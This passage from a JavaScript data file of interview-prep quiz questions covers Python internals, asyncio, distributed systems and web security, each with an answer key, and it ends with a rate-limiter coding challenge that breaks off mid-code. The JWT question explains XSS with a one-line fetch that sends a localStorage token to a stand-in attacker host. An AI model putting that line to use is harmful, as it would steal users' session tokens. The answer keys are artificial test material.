      'Memory allocations in CPython require acquiring a global Linux kernel lock on every integer increment.'
    ],
    correctIndex: 1,
    explanation: 'The GIL serializes bytecode execution. In multi-core systems, the OS schedules thread A on Core 0 and thread B on Core 1. Both threads spin, request, and fight over the GIL mutex. The resulting OS thread context switches, cache line ping-ponging, and lock signaling cause execution to take longer than if a single thread executed both tasks sequentially.',
    analogy: 'Imagine a classroom with 16 chalkboards (CPU cores), but only 1 stick of chalk (the GIL). Even if 16 students stand at 16 boards, only 1 student can write at any millisecond while 15 students aggressively sprint back and forth wrestling for the single piece of chalk!'
  },
  {
    id: 'p-mcq-27',
    track: 'python',
    category: 'Descriptors & Python Data Model',
    company: 'Meta',
    difficulty: 'Hard',
    question: 'What is the precise behavioral difference between a Data Descriptor and a Non-Data Descriptor when accessing an attribute on a class instance in Python?',
    options: [
      'Data descriptors can only store numeric datatypes; non-data descriptors store strings.',
      'A Data Descriptor defines both `__get__` and `__set__` (or `__delete__`), and ALWAYS takes precedence over an instance\'s `__dict__`. A Non-Data Descriptor defines only `__get__` (e.g. methods), meaning an entry in the instance\'s `__dict__` will override and shadow the descriptor.',
      'Non-data descriptors are executed in C, while data descriptors are executed in Python.',
      'Data descriptors require the `@dataclass` decorator.'
    ],
    correctIndex: 1,
    explanation: 'Python\'s attribute lookup order in `object.__getattribute__` is: 1) Data descriptor found on the class (and its MRO). 2) Instance dictionary `instance.__dict__`. 3) Non-data descriptor on class. 4) Class dictionary. If an object has a Data Descriptor named `x`, setting `instance.__dict__["x"] = 99` is ignored; the descriptor\'s `__get__` is still called.',
    analogy: 'A Data Descriptor is like an automated water meter installed on your house pipe: you cannot bypass it by putting a private bucket in your living room (instance __dict__). But a Non-Data Descriptor is like an advisory signpost that you can easily overwrite with your own note!'
  },
  {
    id: 'p-mcq-28',
    track: 'python',
    category: 'Metaclasses & Class Construction',
    company: 'Amazon',
    difficulty: 'Hard',
    question: 'In CPython class creation, what is the exact execution sequence and difference between a metaclass\'s `__new__` and `__init__` methods?',
    options: [
      '`__init__` allocates the raw C struct memory; `__new__` registers the class in `sys.modules`.',
      '`__new__` is called to instantiate and return the new class object (type instance), taking `(mcs, name, bases, dct)`; `__init__` is called after the class object has already been created to initialize its attributes before returning it to the module scope.',
      '`__new__` is only called for abstract base classes, while `__init__` runs for concrete classes.',
      'There is no difference; both are alias wrappers around `type.__call__`.'
    ],
    correctIndex: 1,
    explanation: 'Metaclasses are classes that produce classes. When Python encounters `class MyClass(metaclass=Meta):`, it calls `Meta.__new__(mcs, name, bases, namespace)`. `__new__` must call `super().__new__` to actually allocate and construct the `type` object in memory. Then `Meta.__init__(cls, name, bases, namespace)` initializes the newly created class object.',
    analogy: '`__new__` is the architectural foundry that casts the iron bell (creating the class type object). `__init__` is the artisan who paints the engravings and polishes the bell after the metal has already cooled and formed!'
  },
  {
    id: 'p-mcq-29',
    track: 'python',
    category: 'Python Memory & Garbage Collection',
    company: 'Netflix',
    difficulty: 'Hard',
    question: 'How does CPython detect and reclaim circular reference memory leaks (e.g. `a.ref = b; b.ref = a; del a, b`), given that reference counting cannot decrement their count to zero?',
    options: [
      'CPython cannot collect cyclic references; developers must use the weakref module exclusively.',
      'The cyclic Garbage Collector tracks container objects (tuples, lists, dicts, custom classes) in 3 generation linked lists; it runs a trial subtraction of reference counts within the container subgraph, and if an isolated subgraph\'s remaining counts are all zero, it identifies them as unreachable garbage and frees them.',
      'By periodically pausing the OS thread and scanning the entire C call stack with Mark-Sweep.',
      'By converting all class attributes into weak references at bytecode compilation time.'
    ],
    correctIndex: 1,
    explanation: 'Reference counting instantly frees objects whose count hits 0. For cycles, count never hits 0. CPython\'s `gc` module maintains 3 generations (Gen 0, 1, 2). During a collection, it copies the reference counts (`gc_refs`) of all container objects in the generation, subtracts internal references between objects in the candidate set, and any group that has 0 external references is proven unreachable and reclaimed.',
    analogy: 'Imagine two students holding hands in a locked, dark room, each claiming "I am not alone because my friend is holding my hand!" The inspector opens the door, checks if anyone outside the room is holding their hands; finding zero outside connections, the inspector confirms the room is abandoned and turns off the lights!'
  },
  {
    id: 'p-mcq-30',
    track: 'python',
    category: 'Asyncio & Event Loop Internals',
    company: 'Apple',
    difficulty: 'Hard',
    question: 'Why will executing `requests.get("https://api.external.com")` inside an `async def` FastAPI endpoint degrade response times for all other concurrent users?',
    options: [
      '`requests` raises an asynchronous syntax error when called inside coroutines.',
      '`requests` uses synchronous blocking socket IO; executing it on the main OS thread halts the single asyncio event loop, preventing all other pending coroutines from resuming until the HTTP request completes.',
      'FastAPI closes the database connection whenever a non-async library is imported.',
      '`requests` locks the Linux epoll file descriptor table.'
    ],
    correctIndex: 1,
    explanation: 'Asyncio uses cooperative multitasking on a single thread. Coroutines must yield control via `await` on non-blocking IO primitives (like `httpx.AsyncClient` or `aiohttp`). When synchronous code like `requests.get` blocks for 1.5 seconds waiting for network packets, the entire thread sleeps; the event loop cannot process any other user requests, timers, or WebSocket frames during that window.',
    analogy: 'The event loop is a master chef who flips 50 pancakes a minute by checking which pan is sizzling. If the chef suddenly freezes and stares out the window for 2 minutes to wait for a delivery driver, all 50 pancakes burn to ashes!'
  },
  {
    id: 'p-mcq-31',
    track: 'python',
    category: 'Python Bytecode & Optimization',
    company: 'Google',
    difficulty: 'Hard',
    question: 'In Python 3.11+, how does the "Specializing Adaptive Interpreter" (PEP 659) achieve significant speedups on repeated attribute lookups like `user.name`?',
    options: [
      'By compiling Python code to WebAssembly binaries.',
      'It monitors bytecode execution; after an instruction is executed repeatedly, it replaces general bytecodes (like `LOAD_ATTR`) with specialized inline cached instructions (like `LOAD_ATTR_INSTANCE_VALUE`) that directly index the object\'s values array without checking the type or dictionary, deoptimizing only if the object\'s shape changes.',
      'By storing all instance variables inside CPU registers.',
      'By disabling the GIL for functions marked with `@optimize`.'
    ],
    correctIndex: 1,
    explanation: 'PEP 659 introduces quickened bytecode. A generic `LOAD_ATTR` transitions from "warm" to "specialized". If the object\'s type dictionary layout remains stable, it swaps the instruction to `LOAD_ATTR_INSTANCE_VALUE`, reading the attribute from a fixed offset in the internal values array in 1 assembly instruction instead of performing expensive dictionary hashing.',
    analogy: 'The first time you look for a book in a library, you search the catalog computer and check the map. Once you know it is always on Shelf 3, Slot 4, you walk straight to Shelf 3 without ever looking at the catalog again!'
  },
  {
    id: 'p-mcq-32',
    track: 'python',
    category: 'Generators & Coroutines Evolution',
    company: 'Meta',
    difficulty: 'Hard',
    question: 'In Python generator delegation, what does `result = yield from subgenerator()` mechanically accomplish that a standard `for item in subgenerator(): yield item` loop CANNOT?',
    options: [
      '`yield from` runs the subgenerator in a separate background thread.',
      'It establishes a transparent bidirectional communication channel: values sent via `send()`, exceptions thrown via `throw()`, and close signals via `close()` are channeled directly to the subgenerator, and the subgenerator\'s `return value` is captured in `result`.',
      '`yield from` pre-allocates all generator elements in C arrays.',
      'It prevents recursion depth limits from being enforced.'
    ],
    correctIndex: 1,
    explanation: 'PEP 380: `yield from` is not simple syntax sugar for a for-loop. It establishes an active conduit between the outer caller and the subgenerator. If the caller invokes `gen.send(val)` or `gen.throw(Exc)`, the event is forwarded straight to the active inner generator. When the subgenerator completes with `return final_val`, Python catches `StopIteration.value` and assigns it to `result`.',
    analogy: 'A standard for-loop is a messenger reading out someone else\'s telegram line by line. `yield from` is plugging a direct telephone patch between the caller and the person in the back room so they can talk, argue, and exchange data directly in real-time!'
  },
  {
    id: 'p-mcq-33',
    track: 'python',
    category: 'Memory Optimization & `__slots__`',
    company: 'Amazon',
    difficulty: 'Hard',
    question: 'Why does declaring `__slots__ = ("id", "username")` on a class containing 10,000,000 instances dramatically reduce memory usage in high-scale microservices?',
    options: [
      'It compresses all string data using Zstandard compression.',
      'It suppresses the creation of the dynamic per-instance `__dict__` (which incurs substantial dictionary hash-table memory overhead) and `__weakref__`, allocating memory as a compact fixed-size C struct array of attribute pointers.',
      'It moves object instances out of the heap into CPU L2 cache lines.',
      'It forces CPython to garbage collect objects every 100 milliseconds.'
    ],
    correctIndex: 1,
    explanation: 'By default, every Python instance has an internal dictionary (`__dict__`) to permit dynamic attribute assignment, consuming ~150-200 bytes per instance even if empty. `__slots__` tells the class to reserve only enough memory for fixed C struct pointers, reducing instance overhead from ~200 bytes to ~48 bytes, saving gigabytes across millions of objects.',
    analogy: 'Standard Python instances are like moving into an apartment and giving every resident their own large walk-in storage room even if they only own a toothbrush. `__slots__` gives each resident exactly two hooks on the wall for their coat and hat, saving 80% of the entire building space!'
  },
  {
    id: 'p-mcq-34',
    track: 'python',
    category: 'Python Closures & Late Binding',
    company: 'Netflix',
    difficulty: 'Hard',
    question: 'What is the output of `[f() for f in [lambda: i for i in range(4)]]` and how does the standard idiom `lambda i=i: i` correct the behavior?',
    options: [
      '`[0, 1, 2, 3]`; the idiom is redundant in modern Python 3.',
      '`[3, 3, 3, 3]`; Python closures bind variables by reference (name lookup in outer scope at invocation time, where `i` ended at 3), whereas default argument evaluation `i=i` binds the current value into the function\'s local tuple at definition time.',
      '`[0, 0, 0, 0]`; lambda defaults reset upon list comprehension completion.',
      '`SyntaxError: closure binding cannot reference iterator target`.'
    ],
    correctIndex: 1,
    explanation: 'Python closures capture variable names, not values (late binding). When the lambdas are executed in the list comprehension, `i` has completed its loop and holds the value `3`. In `lambda i=i: i`, default arguments are evaluated at function creation time, binding a snapshot of the current integer value into the function object\'s `__defaults__`.',
    analogy: 'Imagine 4 students told: "Write down the temperature shown on the thermometer at 5 PM." If they all check the thermometer at 5 PM, they all write down 30°C! The default argument is giving each student a photo of the thermometer at 1 PM, 2 PM, 3 PM, and 4 PM to take home!'
  },
  {
    id: 'p-mcq-35',
    track: 'python',
    category: 'FastAPI & Dependency Injection',
    company: 'Apple',
    difficulty: 'Hard',
    question: 'In FastAPI, what is the life-cycle and scope behavior of a dependency defined with `async def get_db(): try: yield db finally: db.close()` when injected into a route?',
    options: [
      'A new database connection is created for every parameter in the route function and never closed.',
      'The code before the `yield` executes prior to running the endpoint handler; the endpoint receives the yielded object, and after the HTTP response has been sent to the client, the code after `yield` (the `finally` block) executes cleanly to clean up resources.',
      'The generator is converted to a background thread daemon.',
      'FastAPI evaluates the generator once at server startup and caches the yielded connection globally.'
    ],
    correctIndex: 1,
    explanation: 'FastAPI dependency injection supports context-manager style generators (`yield`). The dependency executes up to the `yield` point, passes the database session to the path operation function, waits for the response to be generated, and executes the cleanup code inside the `finally` block even if an unhandled exception occurred during the route processing.',
    analogy: 'It is like borrowing a library book with an automatic security escort: the librarian hands you the book before you sit at the study desk (`yield`), and as soon as you stand up to leave the library, the librarian takes the book back and locks it in the cabinet (`finally`).'
  },
  {
    id: 'p-mcq-36',
    track: 'python',
    category: 'CPython Small Integer Caching & Identity',
    company: 'Google',
    difficulty: 'Hard',
    question: 'Why does `a = 256; b = 256; a is b` evaluate to `True`, while in the interactive REPL `a = 257; b = 257; a is b` evaluates to `False`?',
    options: [
      '256 is the maximum number representable in 8-bit unsigned registers.',
      'CPython pre-allocates and caches an internal singleton array of integer objects in the range `[-5, 256]` at startup; integers outside this range allocate fresh `PyLongObject` instances on the heap unless folded by the bytecode constant table in the same compilation unit.',
      'Numbers above 256 are stored in floating point registers.',
      'The `is` operator switches to string comparison above 256.'
    ],
    correctIndex: 1,
    explanation: 'In CPython\'s `longobject.c`, an array of 262 integer objects (`small_ints`) is pre-allocated from -5 to 256 inclusive. Any reference to numbers in this range returns a pointer to the existing cached singleton. For numbers >= 257, new heap allocations occur, so their memory addresses differ (`is` tests pointer identity, not value equality).',
    analogy: 'The hostel laundry keeps pre-printed locker tokens from 1 to 256 in a tray ready to hand out instantly. But if student #257 arrives, the warden has to take out a wooden block and manually carve a brand new custom token on the spot!'
  },
  {
    id: 'p-mcq-37',
    track: 'python',
    category: 'Asyncio & Exception Propagation',
    company: 'Meta',
    difficulty: 'Hard',
    question: 'In Python 3.11+, what is the advantage of `asyncio.TaskGroup` over `asyncio.gather(*tasks, return_exceptions=False)` when handling task failures?',
    options: [
      '`TaskGroup` compiles asynchronous functions into native C pthreads.',
      'If any sub-task inside a `TaskGroup` raises an exception, the remaining active tasks in the group are immediately cancelled, and exceptions are collected and raised together in an `ExceptionGroup`, preventing orphaned background tasks from leaking.',
      '`TaskGroup` automatically retries failed tasks up to 3 times.',
      '`TaskGroup` runs without acquiring the GIL.'
    ],
    correctIndex: 1,
    explanation: '`asyncio.gather` has hazardous cancellation semantics: if one task fails, other tasks continue running in the background unaware ("orphaned tasks"). `TaskGroup` (PEP 654) implements structured concurrency: if one task fails, all other child tasks are cancelled cleanly, and the group re-raises all errors wrapped in an `ExceptionGroup` (`except*`).',
    analogy: 'Imagine a group project where 3 students are tasked with building a stage prop. If student #1 accidentally sets the wood on fire, `TaskGroup` immediately sounds the alarm and stops the other two students from painting. `gather` would let the other two keep painting while the workshop burns down!'
  },
  {
    id: 'p-mcq-38',
    track: 'python',
    category: 'Python C-Extension & Memoryview',
    company: 'Amazon',
    difficulty: 'Hard',
    question: 'What is the key performance benefit of `memoryview(byte_buffer)` when slicing and processing high-throughput 500MB video/network streams in Python?',
    options: [
      'It converts binary data into JSON strings in parallel.',
      'Zero-copy slicing: Slicing a `memoryview` creates an exposing window over the underlying C-buffer (via Python Buffer Protocol) without copying memory bytes, avoiding massive heap allocations and CPU cache thrashing.',
      'It compresses memory bytes into GPU texture buffers.',
      'It unlocks the GIL for all mathematical operations.'
    ],
    correctIndex: 1,
    explanation: 'In Python, taking a normal slice of bytes (`data[1000:5000]`) allocates a brand new `bytes` object and copies the memory. For a 500MB stream processed in small chunks, this causes massive GC pressure and gigabytes of wasted copies. A `memoryview` exposes the Python Buffer Protocol (`Py_buffer`), allowing slices to point directly to memory offsets without copying a single byte.',
    analogy: 'Instead of photocopying a 500-page encyclopedia every time you want to read chapter 4, you simply open the existing book to page 100 with a physical bookmark (zero-copy memoryview)!'
  },
  {
    id: 'p-mcq-39',
    track: 'python',
    category: 'Celery Distributed Task Architecture',
    company: 'Netflix',
    difficulty: 'Hard',
    question: 'In high-reliability Celery worker deployments, why is configuring `task_acks_late = True` paired with `worker_prefetch_multiplier = 1` crucial for long-running heavy jobs?',
    options: [
      'It allows workers to write task results directly to AWS S3 without Redis.',
      'By default, Celery acknowledges tasks BEFORE execution; if a worker crashes mid-task, the job is lost forever. `acks_late=True` acknowledges only after successful completion, and `prefetch=1` stops a worker from greedily hoarding long-running tasks, distributing them evenly across available nodes.',
      'It enables GPU CUDA acceleration on Celery workers.',
      'It forces Celery to use SQLite instead of RabbitMQ.'
    ],
    correctIndex: 1,
    explanation: 'By default (`acks_late=False`), a Celery worker acknowledges the message from RabbitMQ/Redis the moment it pulls it from the queue. If the worker encounters an OS OOM-kill or hardware crash, the task disappears. With `acks_late=True`, the task remains unacknowledged until completion. `prefetch=1` ensures the worker only reserves 1 job at a time, avoiding head-of-line blocking.',
    analogy: 'A restaurant waiter who grabs 10 order tickets from the kitchen and marks them all as "Served" before cooking has even started! If that chef passes out from heat, 10 tables starve. `acks_late` and `prefetch=1` means the chef takes 1 ticket at a time and only stamps it done when the dish is on the table!'
  },
  {
    id: 'p-mcq-40',
    track: 'python',
    category: 'Python OOP & Multiple Inheritance MRO',
    company: 'Apple',
    difficulty: 'Hard',
    question: 'In Python\'s C3 Linearization algorithm for Multiple Inheritance, why does `class A(B, C): pass` raise `TypeError: Cannot create a consistent method resolution order (MRO)` in certain diamond inheritance structures?',
    options: [
      'Python forbids having more than one parent class unless one is `object`.',
      'The inheritance hierarchy contains a monotonic contradiction where class B requires class C to precede it in the MRO, while the class declaration specifies B before C, making linear ordering mathematically impossible.',
      'The compiler detects that methods in B and C have identical names.',
      'Python metaclasses enforce strict single-tree inheritance on Unix systems.'
    ],
    correctIndex: 1,
    explanation: 'Python uses the C3 Linearization algorithm to compute the MRO. C3 enforces two invariants: 1) Children precede parents. 2) The relative order of base classes declared in the class definition must be preserved. If class B inherits from C, but a child declares `class A(C, B)`, C3 detects that C must precede B according to declaration, but B must precede C according to inheritance, throwing a TypeError.',
    analogy: 'If rule #1 says "Parents must walk ahead of children", but rule #2 says "Guests must walk ahead of hosts", and the guest happens to be the child of the host, the guide cannot arrange a single line without violating one of the two strict rules!'
  },
  {
    id: 'p-mcq-41',
    track: 'python',
    category: 'Python Metaprogramming & `__init_subclass__`',
    company: 'Google',
    difficulty: 'Hard',
    question: 'Why did Python 3.6 introduce `__init_subclass__` as a preferred alternative to custom metaclasses for simple plugin and class registration architectures?',
    options: [
      '`__init_subclass__` runs in WebAssembly while metaclasses run in CPython.',
      'It allows parent classes to intercept and configure subclasses automatically without creating complex metaclasses that trigger metaclass conflict errors when combined with multiple inheritance.',
      '`__init_subclass__` bypasses Python\'s garbage collection cycles.',
      'It automatically converts all methods into static methods.'
    ],
    correctIndex: 1,
    explanation: 'PEP 487 introduced `__init_subclass__`. Metaclasses frequently cause "metaclass conflict" errors when multiple classes with different metaclasses are combined in multiple inheritance. `__init_subclass__` provides a clean hook on standard classes that is called whenever a subclass is defined, allowing registry patterns, validation, and attribute injection without metaclass baggage.',
    analogy: 'Instead of building an entirely custom manufacturing factory just to stamp a serial number on a bicycle frame (metaclass), the factory simply installs an inspection stamp right on the assembly line conveyor (`__init_subclass__`)!'
  },
  {
    id: 'p-mcq-42',
    track: 'python',
    category: 'Python Threading vs Multiprocessing',
    company: 'Meta',
    difficulty: 'Hard',
    question: 'When using `multiprocessing.Pool` on Linux vs macOS/Windows, why did Python 3.8 change the default start method on macOS from `"fork"` to `"spawn"`?',
    options: [
      'macOS discontinued support for POSIX process creation.',
      '`fork()` without `exec()` on macOS frequently causes deadlocks in multi-threaded processes that use Apple system frameworks (like CoreFoundation, Cocoa, or Objective-C runtime locks), whereas `"spawn"` starts a fresh clean Python interpreter process.',
      '`"fork"` cannot share memory on Apple Silicon ARM chips.',
      '`"spawn"` is 10x faster at process creation than `"fork"`.'
    ],
    correctIndex: 1,
    explanation: 'When a process containing multiple threads calls `fork()`, only the thread that called fork is cloned into the child process. Any locks held by other threads at that exact moment remain locked forever in the child because those other threads do not exist to unlock them! Apple system frameworks use internal threads; forking without exec leads to immediate deadlocks. `"spawn"` creates a fresh process.',
    analogy: 'Imagine taking an instantaneous snapshot photo of a busy hostel kitchen and bringing only the chef into a new room. If another student was holding the spice cupboard key in the photo, the spice cupboard in the new room is locked forever because that student was never cloned!'
  },
  {
    id: 'p-mcq-43',
    track: 'python',
    category: 'Python Generators & Context Managers',
    company: 'Amazon',
    difficulty: 'Hard',
    question: 'In `@contextlib.contextmanager`, why must an exception raised inside the `with` block be explicitly re-raised or handled inside the generator function?',
    options: [
      'Uncaught exceptions in context managers cause immediate segmentation faults in CPython.',
      'The exception is injected into the generator at the `yield` statement via `generator.throw()`; if the generator\'s `try...finally` does not catch it or suppress it by returning True, it re-propagates upwards to the caller.',
      'Context managers convert all exceptions into `StopIteration`.',
      'The Python interpreter swallows all exceptions raised inside `with` blocks by default.'
    ],
    correctIndex: 1,
    explanation: 'When an exception occurs inside a `with` block, the context manager\'s `__exit__` method invokes `generator.throw(type, value, traceback)` at the point where the generator was suspended at `yield`. If you wrap the yield in `try...finally: cleanup()`, cleanup runs. If you want to suppress the exception, you must catch it; otherwise, it naturally bubbles up.',
    analogy: 'When you borrow lab goggles and accidentally drop a test tube, the lab safety protocol (`__exit__`) throws the emergency alert right back to you at the counter (`yield`). You must sweep the broken glass (`finally`) before leaving!'
  },
  {
    id: 'p-mcq-44',
    track: 'python',
    category: 'Python 3.13 Free-Threaded Python',
    company: 'Netflix',
    difficulty: 'Hard',
    question: 'In Python 3.13\'s experimental free-threaded build (PEP 703 - No-GIL), how is thread-safe memory management achieved without the global lock?',
    options: [
      'By converting all data types to immutable persistent data structures.',
      'Through mimalloc thread-local memory allocators, biased reference counting, and immortal/deferred reference counting for globally shared objects to minimize atomic CPU bus contention.',
      'By running every thread in a separate Linux cgroup container.',
      'By relying on OS kernel transactional memory exclusively.'
    ],
    correctIndex: 1,
    explanation: 'PEP 703 removes the GIL by: 1) Using mimalloc for thread-isolated allocation arenas. 2) Replacing standard reference counts with biased/atomic reference counts. 3) Immortalizing objects that never die (singletons, code objects, interned strings) so threads never perform atomic operations on their reference counts, keeping multi-core CPU scaling linear.',
    analogy: 'Instead of having 1 master campus guard who must approve every single step every student takes, each student hostel wing has its own independent turnstile, and senior faculty badges are marked permanent so they never need a guard check at all!'
  },
  {
    id: 'p-mcq-45',
    track: 'python',
    category: 'FastAPI & Pydantic V2 Internals',
    company: 'Apple',
    difficulty: 'Hard',
    question: 'Why is Pydantic V2 (used in modern FastAPI) over 5x to 20x faster at JSON parsing and schema validation than Pydantic V1?',
    options: [
      'It compiles Python code into C++ templates at startup.',
      'The core validation engine was completely rewritten in Rust (`pydantic-core`), generating an optimized validation graph in native machine code that parses JSON directly into validated objects without intermediate Python dictionary creation.',
      'It skips all data validation if input is smaller than 1MB.',
      'It utilizes GPU SIMD vector instructions via OpenCL.'
    ],
    correctIndex: 1,
    explanation: 'Pydantic V1 validated data using recursive Python function calls over Python dictionaries, creating massive interpreter overhead. Pydantic V2 re-architected the core in Rust (`pydantic-core`). It compiles Pydantic schema models into a Rust validation execution graph; incoming JSON bytes are parsed and validated directly in native Rust code with zero Python interpreter overhead.',
    analogy: 'Pydantic V1 was like taking foreign customs forms, translating each word into Hindi with a pocket dictionary, then typing it into a ledger. Pydantic V2 is an automated laser passport scanner that reads and verifies the biometric chip in 2 milliseconds flat!'
  },
  {
    id: 'p-mcq-46',
    track: 'general',
    category: 'System Design & Database Consistency',
    company: 'Google',
    difficulty: 'Hard',
    question: 'Under the Raft Consensus Algorithm, what prevents a split-brain leader from committing an un-replicated log entry during a temporary network partition?',
    options: [
      'The partition leader asks the NTP clock server to synchronize system time.',
      'A leader can only commit an entry after it has been successfully replicated to a strict majority (`N/2 + 1`) of nodes; an isolated leader in a minority partition can never achieve a quorum and its entries remain uncommitted until it steps down upon contacting a higher-term leader.',
      'All Raft nodes must be connected over a single physical optical fiber ring.',
      'Heartbeat packets use SHA-256 proofs of work.'
    ],
    correctIndex: 1,
    explanation: 'In Raft, safety is guaranteed by majority quorums. In a 5-node cluster partitioned into 2 and 3 nodes, the old leader in the minority partition (2 nodes) cannot get acknowledgments from 3 nodes. The majority partition (3 nodes) elects a new leader with a higher term number and commits entries. When the partition heals, the old leader discovers the higher term and steps down.',
    analogy: 'In a 5-judge university sports tournament, if 2 judges get disconnected in an elevator, they cannot award the gold medal because 3 votes are legally required for a majority verdict!'
  },
  {
    id: 'p-mcq-47',
    track: 'general',
    category: 'Distributed Caching & Redis Internals',
    company: 'Meta',
    difficulty: 'Hard',
    question: 'How does Redis achieve sub-millisecond execution times of 100,000+ operations per second on a single thread without CPU multi-core parallelism?',
    options: [
      'By running inside the Linux kernel network card driver via eBPF.',
      'By operating entirely in-memory with highly optimized C data structures (sds, ziplist, skiplist, dict) and utilizing non-blocking asynchronous IO multiplexing (epoll/kqueue) that eliminates thread context-switch overhead and locking contention.',
      'By writing all data asynchronously to NVMe SSD queues.',
      'By running parallel threads for every incoming client socket.'
    ],
    correctIndex: 1,
    explanation: 'Redis operations are entirely in-RAM (no disk seek delays). Because Redis executes commands on a single thread, it has zero lock contention, zero race conditions, and zero OS thread context switching overhead. It multiplexes thousands of incoming socket connections using native OS event notifications (`epoll` on Linux), processing commands sequentially in nanoseconds.',
    analogy: 'A master ping-pong champion standing at a single table returning balls one-by-one in a rhythm of 1 return every 0.1 second. If you added 5 coaches bumping elbows around the same table trying to coordinate, they would trip over each other and play slower!'
  },
  {
    id: 'p-mcq-48',
    track: 'general',
    category: 'Database Internals & LSM-Trees',
    company: 'Amazon',
    difficulty: 'Hard',
    question: 'Why do write-heavy distributed databases like Cassandra, RocksDB, and ScyllaDB use Log-Structured Merge-Trees (LSM-Trees) instead of traditional B-Trees?',
    options: [
      'LSM-Trees store all records in compressed JSON format.',
      'B-Trees require random disk writes to update tree pages in-place, which causes severe IOPS bottlenecks on spinning disks and SSDs; LSM-Trees append writes sequentially to an in-memory MemTable and Write-Ahead Log (WAL), then flush immutable SSTables to disk in bulk sequential IO.',
      'LSM-Trees do not require indexing of primary keys.',
      'B-Trees cannot scale beyond 100 gigabytes of data.'
    ],
    correctIndex: 1,
    explanation: 'Updating a B-Tree requires locating and overwriting specific 4KB or 8KB pages scattered randomly across disk sectors (Random IO). LSM-Trees convert all random writes into sequential appends: writes go to an in-memory sorted skip-list (Memtable) and sequential WAL. When full, Memtables flush sequentially to disk as immutable SSTables. Sequential disk write throughput is 100x faster than random write IOPS.',
    analogy: 'If you take notes in class, you don\'t erase and rewrite old pages every 5 seconds (random write B-Tree). You write continuously on fresh notebook lines in sequential order (LSM append), and organize them into tidy study binders at the end of the semester (SSTable compaction)!'
  },
  {
    id: 'p-mcq-49',
    track: 'general',
    category: 'API Security & OAuth 2.0 / JWT',
    company: 'Netflix',
    difficulty: 'Hard',
    question: 'Why is storing sensitive JWT session tokens in browser `localStorage` vulnerable to XSS attacks, and what is the industry gold standard mitigation?',
    options: [
      'LocalStorage is cleared whenever the user closes the browser tab.',
      'Any JavaScript code executed via an XSS injection vulnerability can read `localStorage.getItem()`; the gold standard is storing the token in an `HttpOnly`, `Secure`, `SameSite=Strict` cookie that JavaScript code cannot access via `document.cookie`.',
      'LocalStorage tokens expire automatically after 60 minutes.',
      'Cookies are stored directly in CPU hardware security enclaves.'
    ],
    correctIndex: 1,
    explanation: '`localStorage` is accessible to ANY script executing on the origin. If a third-party npm dependency or XSS vulnerability injects malicious JS, it can exfiltrate the JWT with one line: `fetch("evil.com?t=" + localStorage.token)`. An `HttpOnly` cookie is inaccessible to JavaScript DOM APIs; the browser automatically attaches it to network requests while forbidding script reads.',
    analogy: 'Keeping your hostel room key under the welcome mat outside your door (localStorage) means any visitor can pick it up. Giving the key to a certified security vault deposit box (HttpOnly cookie) means only the authorized lock manager can touch it!'
  },
  {
    id: 'p-mcq-50',
    track: 'general',
    category: 'Modern Web Architecture & HTTP/2 vs HTTP/3',
    company: 'Apple',
    difficulty: 'Hard',
    question: 'What fundamental transport layer problem of HTTP/2 did HTTP/3 resolve by replacing TCP with QUIC (UDP-based)?',
    options: [
      'HTTP/2 lacked SSL/TLS encryption capabilities.',
      'TCP Head-of-Line (HoL) Blocking: In HTTP/2, all multiplexed HTTP streams share a single TCP connection. If a single packet drops, the entire TCP connection stalls for all streams while retransmitting; QUIC implements independent stream loss recovery over UDP so a dropped packet only pauses that specific stream.',
      'HTTP/2 packets could not traverse NAT routers.',
      'HTTP/3 eliminates the requirement for DNS resolution.'
    ],
    correctIndex: 1,
    explanation: 'HTTP/2 multiplexes multiple logical streams over a single TCP socket. However, TCP is a byte-stream protocol: if packet #14 drops, TCP holds up packets #15 to #50 at the receiver until packet #14 is retransmitted (Head-of-Line blocking), freezing ALL concurrent HTTP streams. QUIC runs over UDP and handles packet loss at the individual stream level, so stream B continues without delay if stream A drops a packet.',
    analogy: 'Imagine 5 cars driving together on a single-lane highway behind 1 truck. If the truck gets a flat tire, all 5 cars are stranded behind it (TCP HoL). HTTP/3 gives every car its own independent highway lane (QUIC over UDP) so one flat tire doesn\'t stop everyone else!'
  }
];

// ----------------------------------------------------------------------------
// 10 HARD FAANG-STANDARD CODING CHALLENGES
// ----------------------------------------------------------------------------
export const FAANG_CODING_CHALLENGES = [
  {
    id: 'f-code-1',
    title: 'Distributed Token Bucket Rate Limiter',
    company: 'Amazon / Stripe',
    difficulty: 'Hard',
    tags: ['Concurrency', 'Distributed Systems', 'Algorithms'],
    statement: `Design and implement a high-concurrency **Token Bucket Rate Limiter**.
The rate limiter must allow a maximum of \`capacity\` requests in bursts, and continuously replenish tokens at a rate of \`refillRatePerSec\` tokens per second.
Calls to \`allowRequest(userId, tokensRequired, currentTimestampMillis)\` must run in O(1) time and be thread-safe.
If sufficient tokens exist, deduct the tokens and return \`true\`; otherwise return \`false\` without deducting tokens.`,
    starterCode: {
      java: `import java.util.concurrent.ConcurrentHashMap;

public class TokenBucketRateLimiter {
    private final double capacity;
    private final double refillRatePerSec;
    private final ConcurrentHashMap<String, UserBucket> buckets = new ConcurrentHashMap<>();

    private static class UserBucket {
        double tokens;
        long lastRefillTimestamp;

        UserBucket(double capacity, long timestamp) {
            this.tokens = capacity;
            this.lastRefillTimestamp = timestamp;
        }
    }

    public TokenBucketRateLimiter(double capacity, double refillRatePerSec) {
        this.capacity = capacity;
        this.refillRatePerSec = refillRatePerSec;
    }

    public synchronized boolean allowRequest(String userId, double tokensRequired, long currentTimestampMillis) {
        // TODO: Refill tokens based on elapsed time and check if tokensRequired can be fulfilled
        UserBucket bucket = buckets.computeIfAbsent(userId, k -> new UserBucket(capacity, currentTimestampMillis));
        
        // Calculate elapsed time in seconds
        double elapsedSeconds = Math.max(0, (currentTimestampMillis - bucket.lastRefillTimestamp) / 1000.0);
        bucket.tokens = Math.min(capacity, bucket.tokens + (elapsedSeconds * refillRatePerSec));
        bucket.lastRefillTimestamp = currentTimestampMillis;

        if (bucket.tokens >= tokensRequired) {
            bucket.tokens -= tokensRequired;
            return true;
        }
        return false;
    }
}`,
      python: `import time
from typing import Dict

class TokenBucketRateLimiter:
    def __init__(self, capacity: float, refill_rate_per_sec: float):
        self.capacity = float(capacity)
        self.refill_rate = float(refill_rate_per_sec)
        self.buckets: Dict[str, dict] = {}

    def allow_request(self, user_id: str, tokens_required: float, timestamp_millis: int) -> bool:
        if user_id not in self.buckets:
            self.buckets[user_id] = {
                "tokens": self.capacity,
                "last_refill": timestamp_millis
            }
        
        bucket = self.buckets[user_id]
        elapsed_sec = max(0.0, (timestamp_millis - bucket["last_refill"]) / 1000.0)
